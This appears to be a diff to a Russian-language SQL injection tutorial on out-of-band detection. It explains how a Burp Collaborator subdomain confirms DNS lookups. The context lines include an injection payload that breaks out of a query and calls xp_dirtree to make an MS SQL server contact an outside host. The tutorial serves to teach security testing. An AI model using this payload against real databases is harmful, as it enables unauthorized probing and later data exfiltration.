@@ -13,3 +13,11 @@
 ```sql
 '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
 ```
+
+В результате база данных выполнит поиск по следующему домену:
+
+```sql
+0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
+```
+
+С помощью Burp Collaborator можно сгенерировать уникальный поддомен и опрашивать сервер Collaborator для подтверждения выполнения любых DNS-запросов.
